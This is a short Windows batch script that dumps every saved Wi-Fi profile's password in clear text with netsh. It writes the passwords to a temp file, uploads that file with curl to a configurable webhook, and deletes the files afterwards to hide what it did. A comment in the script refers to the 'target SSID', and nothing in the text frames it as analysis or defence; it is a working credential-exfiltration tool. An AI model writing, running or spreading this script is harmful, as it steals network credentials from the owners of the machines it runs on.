@echo off
setlocal enabledelayedexpansion
set webhook= 
cd %temp%
netsh wlan show profiles | findstr /R /C:"[ ]:[ ]" > 789.txt  
for /f "tokens=5*" %%i in (789.txt) do ( set val=%%i %%j 
if "!val:~-1!" == " " set val=!val:~0,-1! 
echo !val! >> final.txt) 
for /f "tokens=*" %%i in (final.txt) do @echo SSID: %%i >> creds.txt & echo #  >> creds.txt & netsh wlan show profiles name=%%i key=clear | findstr /N /R /C:"[ ]:[ ]" | findstr 33 >> creds.txt & echo #  >> creds.txt & echo # Key content is the password of your target SSID. >> creds.txt & echo #  >> creds.txt 
curl --silent --output /dev/null -F h=@"%temp%\creds.txt" %webhook%
del /q creds.txt 789.txt final.txt 
pause
exit 
